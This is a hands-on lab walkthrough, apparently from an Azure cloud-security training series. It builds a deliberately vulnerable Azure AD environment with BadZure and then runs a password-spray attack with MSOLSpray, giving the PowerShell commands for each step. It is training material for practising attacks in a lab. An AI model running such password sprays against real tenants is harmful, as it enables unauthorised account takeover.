
### References
* https://github.com/mvelazc0/BadZure/
* https://www.youtube.com/watch?v=7IdyU7tQgww

### Pre-Requisites
1. Deploy Azure PenTest VM
* https://github.com/davidokeyode/azure-cloudsec-practitioner/tree/main/pentest-vm-win
* https://davidokeyode.medium.com/azure-cloudsec-practitioner-series-1-deploying-an-azure-pentest-vm-f65adbc40edb

2. You are logged into the Azure PenTest VM

### Prepare the environment
1. Verify Dependencies
```
Get-Module Microsoft.Graph -ListAvailable
Get-Module Azure -ListAvailable
```

2.  Connect to Azure and Microsoft Graph
```
Connect-AzAccount
Connect-MgGraph
```

3. Import the BadZure Script
```
cd $env:SystemDrive\PentestTools\Azure\VulnerableEnv\BadZure
. ./Invoke-BadZure.ps1
```

4. Make note of the username and password for the three attack paths
![Attack Path Output](image.png)

5. Review populated users
```
ls
notepad users.txt
```

### Run MSOLSpray to simulate a password spray attack
1. Import the MSOLSpray module
```
cd $env:SystemDrive\PentestTools\Azure\Attack\MSOLSpray
Import-Module .\MSOLSpray.ps1
```

2. Copy the users.txt file from the BadZure directory to the MSOLSpray directory
* This contains a list of users that will be targets for the password spray attack
```
Copy-Item -Path "$env:SystemDrive\PentestTools\Azure\VulnerableEnv\BadZure\users.txt" -Destination "$env:SystemDrive\PentestTools\Azure\Attack\MSOLSpray"
```

3. Run MSOLSpray
```
Invoke-MSOLSpray -UserList .\users.txt -Password "PASSWORD_FROM_THE_ATTACK_PATH_OUTPUT" -Verbose -OutFile .\sprayresults.txt
```

4. View the result
* Notice that the user with the password from the attack path output was compromised
```
notepad sprayresults.txt
```

